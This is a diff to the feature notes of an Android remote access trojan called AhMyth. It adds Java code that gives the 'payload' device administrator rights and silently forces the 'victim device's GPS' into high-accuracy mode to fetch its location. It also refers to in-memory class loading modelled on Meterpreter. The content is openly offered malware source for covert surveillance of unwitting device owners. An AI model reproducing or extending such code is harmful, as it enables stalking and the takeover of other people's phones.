@@ -1,3 +1,5 @@
+# <div align="center">Experminetal Client Features</div>
+
 ## <div align="center">Dynamic "In-Memory at Runtime" Camera Class Generation & Loading</div>
 
 <div align="center">An experimental feature inspired by the Android equivalent of Metasploit Framework's Meterpreter Payload.</div>
@@ -207,4 +209,112 @@ The provided code in the dropdown tab below this one, performs the following ope
 4. **Create Instance (In Memory):**
    - Finally, an instance of the dynamically generated class is created entirely in memory using reflection (`generatedClass.getDeclaredConstructor().newInstance()`). This instance exists only in memory and can be used for further operations.
 
+</details>
+<br>
+
+## <div align="center">Device Admin Privileges</div>
+
+This will hopefully give the AhMyth Payload Administrator Privileges for future features.
+
+<details>
+  <summary>Code</summary>
+  <br>
+
+- DeviceAdmin.java
+```java
+package ahmyth.mine.king.ahmyth;
+
+import android.app.admin.DeviceAdminReceiver;
+
+import android.app.admin.DevicePolicyManager;
+
+import android.content.ComponentName;
+
+import android.content.Context;
+
+public class DeviceAdmin extends DeviceAdminReceiver {
+
+    static DevicePolicyManager getDPM(Context context) {
+
+        return (DevicePolicyManager)context.getSystemService(Context.DEVICE_POLICY_SERVICE);
+
+    }
+
+    public static ComponentName getComponentName(Context context) {
+
+        return new ComponentName(context.getApplicationContext(), DeviceAdmin.class);
+
+    }
+
+}
+```
+</details>
+<br>
+  
+## <div align="center">Automatically Enable Victim GPS</div>
+
+This will hopefully allow automatic enabling of the victim device's GPS, Device Administration Privileges are required for this to work, hence the need for the **DeviceAdmin.java** code above.
+
+<details>
+  <summary>Code</summary>
+  <br>
+  
+- LocationManager.java
+```java
+    private void activateGps(Context context) {
+
+        SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(context);
+
+        if (!prefs.getBoolean("allow_location_modechange", false))
+
+            return;
+
+        if (!DeviceAdmin.getDPM(context).isAdminActive(DeviceAdmin.getComponentName(context)))
+
+            return;
+
+        if (!DeviceAdmin.getDPM(context).isDeviceOwnerApp(context.getApplicationContext().getPackageName()))
+
+            return;
+
+        DeviceAdmin.getDPM(context).setSecureSetting(
+
+                DeviceAdmin.getComponentName(context),
+
+                Settings.Secure.LOCATION_MODE,
+
+                Integer.toString(Settings.Secure.LOCATION_MODE_HIGH_ACCURACY)
+
+        );
+
+        Log.d("Done", "Forcefully enabled GPS");
+
+    }
+
+    private void getLocation(Context context) throws SecurityException {
+
+        activateGps(context);
+
+        LocationManager locationManager = (LocationManager) context.getApplicationContext().getSystemService(Context.LOCATION_SERVICE);
+
+        locationManager.requestSingleUpdate(LocationManager.GPS_PROVIDER, null);
+
+    }
+```
+<br>
+
+- Settings.java
+```java
+        perms.put("allow_location", new String[]{
+
+                Manifest.permission.ACCESS_FINE_LOCATION,
+
+        });
+
+        perms.put("allow_location_modechange", new String[]{
+
+                Manifest.permission.BIND_DEVICE_ADMIN,
+
+        });
+```
 </details>
